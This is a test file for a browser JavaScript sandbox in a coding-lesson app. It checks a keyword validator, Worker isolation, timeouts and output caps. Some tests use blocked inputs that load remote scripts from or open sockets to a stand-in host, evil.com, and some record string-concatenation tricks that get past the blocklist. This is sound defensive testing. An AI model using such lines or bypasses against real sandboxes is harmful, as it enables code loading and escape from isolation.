import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { validateJavaScriptSandbox, executeJavaScript } from './javascript-sandbox'
import { DEFAULT_JUDGE_MODE, judgeOutput } from './challenge-judge'
import { challenges } from '../data/challenges'
import { EXECUTION_SETTINGS } from '../utils/constants'
import type { Lesson } from '../types/lesson'

const mockLesson: Lesson = {
  id: 'test-js',
  language: 'javascript',
  languageLabel: 'JavaScript',
  label: '01',
  title: 'Test JS',
  description: 'Test',
  duration: '5 min',
  level: '入门',
  progress: 0,
  code: '',
  flow: [],
  insight: '',
  fileName: 'test.js',
  runtime: 'Browser JS',
  content: {
    objective: '',
    prerequisites: [],
    explanation: [],
    examples: [],
    guidedSteps: [],
    exercise: '',
    variant: '',
    projectTask: '',
    mistakes: [],
    runCommand: '',
    completion: '',
    reviewOffsetsDays: [],
  },
}

type WorkerOutbound = { type: string; value?: string; message?: string; line?: number }

/**
 * 本仓库未安装 @types/node（不新增依赖），沿用 learning-path-view.m3.test.tsx 的手法：
 * 变量说明符 + 动态 import，并只给用到的那两个 API 做局部类型收窄。
 */
const vmSpecifier: string = 'node:vm'
const { Script, createContext } = (await import(vmSpecifier)) as {
  Script: new (source: string, options?: { filename?: string }) => { runInContext: (context: unknown) => unknown }
  createContext: (sandbox: object) => object
}

/**
 * 在非浏览器测试环境里跑**引擎真正生成的那份 Worker 脚本**。
 *
 * 为什么不是旧的「postMessage 里 new Function 一下」：那样 fake 实现的是测试自己想象的协议，
 * 引擎生成什么它不看什么。CSP 拦掉 `new Function` 那次（历史执行记录 docs/M6-整体验收-执行记录.md §19）就是这么躲过去的——
 * jsdom 没有 CSP，也没有真实的 Worker 脚本文本。现在 FakeWorker 直接把 `new Blob([...])`
 * 收下的源码取出来，用 `node:vm` 以真实脚本形态编译（filename 与脚本内的 `__cwSelfUrl` 对上），
 * 于是输出上限、console 包装、错误行号折算这些**脚本里的逻辑**第一次真的被执行到。
 */
const SCRIPT_NAME = 'cw-sandbox-worker.js'
let lastWorkerSource = ''

class FakeBlob {
  constructor(parts: unknown[]) {
    lastWorkerSource = parts.map((p) => String(p)).join('')
  }
}

class FakeWorker {
  static instances: FakeWorker[] = []
  onmessage: ((event: { data: WorkerOutbound }) => void) | null = null
  onerror: ((event: { message: string; lineno?: number }) => void) | null = null
  terminated = false

  constructor(_url: string) {
    FakeWorker.instances.push(this)
    queueMicrotask(() => this.run())
  }

  private deliver(message: WorkerOutbound) {
    if (this.terminated) return
    this.onmessage?.({ data: message })
  }

  private run() {
    if (this.terminated) return
    const context = createContext({
      self: {
        location: { href: SCRIPT_NAME },
        postMessage: (message: WorkerOutbound) => this.deliver(message),
      },
    })
    // vm.Script 而不是 new Function：函数构造器给正文加两行包装，堆栈行号整体下移，
    // 行号折算那条判据就成了假绿。编译与执行同在一个 try 里——编译不过等于浏览器那边的
    // 「脚本没能开始执行」，走 onerror；用户代码里的异常由生成脚本自带的 try/catch 兜住。
    try {
      new Script(lastWorkerSource, { filename: SCRIPT_NAME }).runInContext(context)
    } catch (error) {
      const detail = error instanceof Error ? error : new Error(String(error))
      const lineno = Number(String(detail.stack || '').match(/cw-sandbox-worker\.js:(\d+)/)?.[1] ?? 0)
      this.onerror?.({ message: detail.message, lineno: lineno || 1 })
    }
  }

  terminate() {
    this.terminated = true
  }
}

describe('javascript-sandbox', () => {
  describe('validateJavaScriptSandbox', () => {
    it('should block fetch calls', () => {
      const error = validateJavaScriptSandbox('fetch("https://api.example.com")')
      expect(error).toBeDefined()
      expect(error?.message).toContain('沙箱禁止')
    })

    it('should block eval calls', () => {
      expect(validateJavaScriptSandbox('eval("alert(1)")')).toBeDefined()
    })

    it('should block window access', () => {
      expect(validateJavaScriptSandbox('window.location = "/"')).toBeDefined()
    })

    it('should allow safe console.log', () => {
      expect(validateJavaScriptSandbox('console.log("Hello")')).toBeUndefined()
    })

    it('should allow arithmetic and variables', () => {
      expect(validateJavaScriptSandbox('let x = 5; let y = x + 3; console.log(y);')).toBeUndefined()
    })

    it('should allow function declarations but block the Function constructor', () => {
      // 回归：/i 的 Function 曾误杀 function 关键字声明
      expect(validateJavaScriptSandbox('function add(a, b) { return a + b; }')).toBeUndefined()
      expect(validateJavaScriptSandbox('const f = new Function("return 1");')).toBeDefined()
      expect(validateJavaScriptSandbox('eval("1 + 1")')).toBeDefined()
    })
  })

  /* ---------------------------------------------------------------
     R4 G.3 第 4 条：明确主线程正则是“提示性检查”，不是安全边界。
     这些用例记录已知绕过形态——它们说明为什么真正的隔离必须依赖 Worker。
     --------------------------------------------------------------- */
  describe('R4：正则只是提示，不是安全边界（已知绕过形态）', () => {
    it('构造字符串拼接可绕过关键字黑名单（记录为已知限制，由 Worker 隔离兜底）', () => {
      // 关键字不出现在源码中：证明正则不能作为安全边界。
      expect(validateJavaScriptSandbox('const k = ["fe", "tch"].join(""); void k')).toBeUndefined()
    })

    it('动态属性访问可绕过（记录为已知限制）', () => {
      expect(validateJavaScriptSandbox('const key = "ev" + "al"; const g = ({}).constructor; void key; void g')).toBeUndefined()
    })

    it('直接书写的敏感能力仍会被提示性拦截', () => {
      expect(validateJavaScriptSandbox('importScripts("https://evil.com/x.js")')).toBeDefined()
      expect(validateJavaScriptSandbox('new WebSocket("wss://evil.com")')).toBeDefined()
      expect(validateJavaScriptSandbox('indexedDB.open("x")')).toBeDefined()
    })

    it('拦截信息显式标注为提示性检查，不宣称绝对安全', () => {
      const error = validateJavaScriptSandbox('fetch("/x")')
      expect(error?.message).toContain('提示性检查')
    })
  })

  describe('executeJavaScript', () => {
    let revokeObjectURL: ReturnType<typeof vi.fn>

    /** 只建 Worker、永不回报任何消息的桩：用来验超时兜底真的会 terminate。 */
    class SilentWorker {
      static instances: SilentWorker[] = []
      onmessage: ((event: { data: WorkerOutbound }) => void) | null = null
      onerror: ((event: { message: string; lineno?: number }) => void) | null = null
      terminated = false
      constructor(_url: string) {
        SilentWorker.instances.push(this)
      }
      terminate() {
        this.terminated = true
      }
    }

    beforeEach(() => {
      FakeWorker.instances = []
      SilentWorker.instances = []
      lastWorkerSource = ''
      vi.stubGlobal('Worker', FakeWorker as unknown as typeof Worker)
      vi.stubGlobal('Blob', FakeBlob as unknown as typeof Blob)
      revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {})
      vi.spyOn(URL, 'createObjectURL').mockReturnValue('blob:mock-worker')
    })

    afterEach(() => {
      vi.unstubAllGlobals()
      vi.restoreAllMocks()
    })

    it('should execute simple console.log through the worker protocol', async () => {
      const result = await executeJavaScript('console.log("Hello World")', mockLesson)

      expect(result.output).toEqual(['Hello World'])
      expect(result.error).toBeUndefined()
      expect(FakeWorker.instances).toHaveLength(1)
    })

    it('should reject blocked patterns before starting a worker', async () => {
      const result = await executeJavaScript('fetch("https://evil.com")', mockLesson)

      expect(result.error).toBeDefined()
      expect(result.error?.message).toContain('沙箱禁止')
      expect(FakeWorker.instances).toHaveLength(0)
    })

    it('should terminate the worker and release the object URL when done', async () => {
      await executeJavaScript('console.log("done")', mockLesson)

      const worker = FakeWorker.instances[0]!
      expect(worker.terminated).toBe(true)
      expect(revokeObjectURL).toHaveBeenCalledWith('blob:mock-worker')
    })

    it('should time out long-running code and terminate the worker', async () => {
      vi.useFakeTimers()
      vi.stubGlobal('Worker', SilentWorker as unknown as typeof Worker)

      const promise = executeJavaScript('while (true) {}', mockLesson)
      await vi.advanceTimersByTimeAsync(EXECUTION_SETTINGS.MAX_EXECUTION_MS + 500)
      const result = await promise

      expect(result.error?.message).toContain('自动停止')
      expect(SilentWorker.instances[0]?.terminated).toBe(true)
      vi.useRealTimers()
    })

    it('should surface runtime errors from the worker', async () => {
      const result = await executeJavaScript('throw new Error("boom")', mockLesson)

      expect(result.error?.message).toBe('boom')
    })

    /* -------------------------------------------------------------
       历史执行记录 docs/M6-整体验收-执行记录.md §19：CSP 不含 'unsafe-eval'，所以代码只能作为 Worker 脚本正文编译。
       下面三条锁的是「真实浏览器第一次点运行就整条链失效」那个形态本身。
       ------------------------------------------------------------- */
    it('用户代码进 Worker 脚本正文，脚本里不出现运行期求值', async () => {
      await executeJavaScript('console.log("abc")', mockLesson)

      expect(lastWorkerSource).toContain('console.log("abc")')
      expect(lastWorkerSource).not.toMatch(/new\s+Function/)
      expect(lastWorkerSource).not.toMatch(/\beval\s*\(/)
    })

    it('生成脚本自身可以被编译为严格模式脚本（语法成立）', async () => {
      await executeJavaScript('const a = 1;\nconsole.log(a)', mockLesson)

      expect(() => new Script(lastWorkerSource, { filename: SCRIPT_NAME })).not.toThrow()
      expect(lastWorkerSource.startsWith('"use strict";')).toBe(true)
    })

    it('行号折算偏移与代码实际所在行一致', async () => {
      await executeJavaScript('console.log("x")', mockLesson)

      const declared = Number(lastWorkerSource.match(/__cwCodeOffset = (\d+);/)?.[1])
      const bodyLines = lastWorkerSource.split('\n')
      expect(bodyLines[declared]).toBe('console.log("x")')
    })

    it('运行错误折算回编辑器里的行号', async () => {
      const result = await executeJavaScript('console.log("before")\nthrow new Error("第 2 行炸了")\nconsole.log("after")', mockLesson)

      expect(result.output).toEqual(['before'])
      expect(result.error?.message).toContain('第 2 行炸了')
      expect(result.error?.line).toBe(2)
    })

    it('语法错误走 onerror，行号不会指到用户看不见的行', async () => {
      const oneLine = await executeJavaScript('const broken = (', mockLesson)
      const threeLines = await executeJavaScript('const a = 1\nconst b = 2\nconst broken = (', mockLesson)

      expect(oneLine.error?.message).toBeTruthy()
      expect(oneLine.error?.line).toBe(1)
      expect(threeLines.error?.line).toBe(3)
    })

    /* -------------------------------------------------------------
       R4 G.3 第 4 条：资源上限、输出洪泛与执行等级标注。
       ------------------------------------------------------------- */
    it('R4：每次运行都标注 tier=worker', async () => {
      const result = await executeJavaScript('console.log("x")', mockLesson)
      expect(result.tier).toBe('worker')
    })

    it('R4：被拦截的代码同样标注 tier=worker，且不启动 Worker', async () => {
      const result = await executeJavaScript('fetch("/x")', mockLesson)
      expect(result.tier).toBe('worker')
      expect(FakeWorker.instances).toHaveLength(0)
    })

    it('R4：超时结果标注 tier=worker 并终止 Worker', async () => {
      vi.useFakeTimers()
      vi.stubGlobal('Worker', SilentWorker as unknown as typeof Worker)

      const promise = executeJavaScript('while (true) {}', mockLesson)
      await vi.advanceTimersByTimeAsync(EXECUTION_SETTINGS.MAX_EXECUTION_MS + 500)
      const result = await promise

      expect(result.tier).toBe('worker')
      expect(SilentWorker.instances[0]?.terminated).toBe(true)
      vi.useRealTimers()
    })

    it('R4：输出洪泛在超过行数上限时报错，不会无限累积', async () => {
      const code = Array.from({ length: EXECUTION_SETTINGS.MAX_OUTPUT_LINES + 50 }, (_, i) => `console.log('第 ${i} 行')`).join('\n')

      const result = await executeJavaScript(code, mockLesson)

      expect(result.output).toHaveLength(EXECUTION_SETTINGS.MAX_OUTPUT_LINES)
      expect(result.error?.message).toContain(`输出超过 ${EXECUTION_SETTINGS.MAX_OUTPUT_LINES} 行上限`)
    })

    it('R4：Worker 不可用时明确降级，不伪装成真实执行', async () => {
      vi.unstubAllGlobals()
      vi.stubGlobal('Worker', undefined)
      const result = await executeJavaScript('console.log("x")', mockLesson)
      expect(result.error?.message).toContain('不支持浏览器 Worker')
      expect(result.tier).toBe('worker')
    })

    /**
     * CHAL-02 第 2 条 · D / J 两关的「关卡可过」不变式。
     *
     * #91 的教训是这条不变式从来没被验过：两关在完整服务下**永远**过不去，界面却一切正常。
     * 浏览器侧目前只有 D 关真点过（取证段 `sandbox`），所以这里把两关都过一遍真执行——
     * FakeWorker 用 node:vm 编译并运行**生成出来的那段脚本**，走的就是现役那条编译路径，
     * 判题用产品同一个 `judgeOutput`，不是自己写一遍近似逻辑。
     */
    for (const challenge of challenges.filter((item) => item.runner === 'javascript-sandbox')) {
      it(`${challenge.id}：起始代码在沙箱里真跑出的输出满足自己的验收点`, async () => {
        const result = await executeJavaScript(challenge.starterCode, mockLesson)
        expect(result.error?.message, `运行报错：${result.error?.message}`).toBeUndefined()
        const outcome = judgeOutput(challenge.targetOutput, result.output, challenge.judgeMode ?? DEFAULT_JUDGE_MODE)
        expect(
          outcome.cases.map((entry) => [entry.expected, entry.matched, entry.actual]),
          `${challenge.id} 实跑输出 ${JSON.stringify(result.output)}，判定 ${JSON.stringify(outcome.cases)}`,
        ).toEqual(challenge.targetOutput.map((target) => [target, true, target]))
        expect(outcome.passed, `${challenge.id} 起始代码过不去自己的关卡`).toBe(true)
      })
    }
  })
})
